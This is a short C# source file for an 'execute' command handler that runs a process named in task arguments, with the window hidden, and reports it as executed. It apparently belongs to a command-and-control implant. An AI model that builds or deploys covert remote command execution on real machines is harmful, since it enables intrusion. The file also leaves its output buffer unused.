using Engineer.Commands;
using Engineer.Models;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Engineer.Commands
{
    internal class ExecuteCommand : EngineerCommand
    {
        public override string Name => "execute";

        public override string Execute(EngineerTask task)
        {
            task.Arguments.TryGetValue("/command", out string command);
            task.Arguments.TryGetValue("/args", out string argument);

            var output = new StringBuilder();

            var process = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    WorkingDirectory = Directory.GetCurrentDirectory(),
                    FileName = command,
                    Arguments = argument,
                    UseShellExecute = true,
                }
            };
            
            process.Start();
            return $"{command} executed";
        }
    }
}
